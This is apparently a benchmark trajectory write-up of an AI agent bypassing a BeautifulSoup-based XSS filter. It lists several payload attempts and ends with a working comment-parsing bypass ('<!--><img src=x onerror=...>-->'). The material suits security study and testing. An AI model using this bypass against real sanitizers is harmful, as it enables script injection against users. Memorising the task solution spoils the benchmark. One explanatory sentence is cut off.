The Challenge

XSS Filter Bypass

The task was to craft an HTML file that, even after being processed by a Python sanitizer, would still execute alert() automatically when opened in a browser.

📋

task_statement.md

bench_trajs/terminal_devops/01_break-filter-js-from-html/task/

There's a /app/filter.py script that attempts to remove JavaScript from HTML files to prevent XSS attacks. The script takes an HTML file as a command-line argument and modifies it in-place.

Usage: python /app/filter.py <html_file>

  • Create /app/out.html that still triggers alert() after being processed by the filter
  • No user interaction required — must trigger automatically on page load
  • Verify with python /app/test_outputs.py
Defense Analysis

What the Filter Does

The agent first read /app/filter.py to understand the sanitizer's three blocking strategies.

✂️

Remove script tags

All <script> elements are found and decomposed, regardless of their type attribute.

🚫

Remove embed tags

Tags like <frame>, <iframe>, <object>, and <embed> are stripped entirely.

🔎

Strip event attributes

For every tag, any attribute whose name starts with "on" is deleted — e.g. onclick, onerror, onload.

filter.py (simplified) 
import sys
from bs4 import BeautifulSoup

with open(path) as f:
    soup = BeautifulSoup(f.read(), "html.parser")

# Rule 1: remove all script tags
for tag in soup("script"):
    tag.decompose()

# Rule 2: remove embed-like tags
for tag in soup(["frame", "iframe", "object", "embed"]):
    tag.decompose()

# Rule 3: remove event handler attributes
for tag in soup.find_all(True):
    for attr in list(tag.attrs):
        if attr.startswith("on"):
            del tag.attrs[attr]
Agent Trajectory

14 Attempts to Break the Filter

The agent methodically explored vector after vector, testing each against the filter before finding the winning exploit.

1

SVG onload handler

Filtered

First instinct: attach JS to an SVG's onload event. The filter strips all "on*" attributes.

<svg onload="alert('XSS')">
2

Meta refresh javascript: URL

Survived / No alert

The meta tag survived — filter doesn't strip non-"on" attributes — but the browser test returned no alert.

<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
3

Base href javascript: URL

Survived / No alert

Survived the filter, but a bare <base> tag doesn't auto-execute JS in modern browsers.

<base href="javascript:alert('XSS')">
4

Anchor + autofocus

Survived / No alert

Both href="javascript:..." and autofocus survived the filter. But autofocus doesn't auto-click a link — it only moves keyboard focus.

<a href="javascript:alert('XSS')" autofocus>Click</a>
5

CSS background url(javascript:…)

No effect

CSS url(javascript:…) properties do not execute JavaScript in any modern browser.

<style> body { background: url('javascript:alert('XSS')'); } </style>
6

SVG inline script

Filtered

BeautifulSoup finds all <script> tags regardless of namespace or parent element.

<svg><script>alert('XSS')</script></svg>
7

Mixed-case onLoad attribute

Filtered

BeautifulSoup normalizes all attribute names to lowercase before the filter runs its startswith("on") check.

<img src="x" onLoad="alert('XSS')">
8

XML namespace prefix: ev:onload

Survived / No alert

The attribute name ev:onload starts with "ev", so the filter's startswith("on") check misses it. But browsers don't treat arbitrary namespace-prefixed attributes as event handlers.

<img src="x" ev:onload="alert('XSS')">
9

Attribute value with newline injection

Not executable

Embedding a newline inside a title attribute value keeps the filter from seeing onload=... as a separate attribute key, but the browser only reads it as an attribute value — not code.

<img title="test\nonload=alert('XSS')">
10

Unicode RTL override in attribute name

Escaped / No alert

Inserting the Right-to-Left Override character (U+202E) in the attribute name evades the filter string check, but browsers ignore the attribute entirely.

<img x‮onload="alert('XSS')">
11

Empty comment as "opener" — wrong syntax

Survived / Treated as comment

Agent tried <!-->...<-->. BeautifulSoup stored the whole thing as a comment node (skipped by the tag iterator). But the browser also treated it as a comment.

<!--><img src=x onerror="alert('XSS')"><-->
✓

Broken comment with proper closer — the winning payload

BYPASS

BeautifulSoup parses <!-->...--> as a single comment node; its contents are never visited as tags. The browser reads <!--> as an immediately-closed comment, then sees <img onerror=...> as live HTML.

<!--><img src=x onerror="alert('XSS Bypass!')">-->
Root Cause

The Parser Divergence

The exploit works because BeautifulSoup and web browsers disagree on how to parse <!-->.

⚡ The Core Trick

The HTML string ). Python's html.parser (used by BeautifulSoup) is lenient — it treats the whole block as a comment node and never iterates its contents as HTML tags. The browser's parser follows the HTML5 spec's error-recovery rules differently, treating <!--> as an immediately terminated empty comment, so what follows becomes live, rendered HTML.
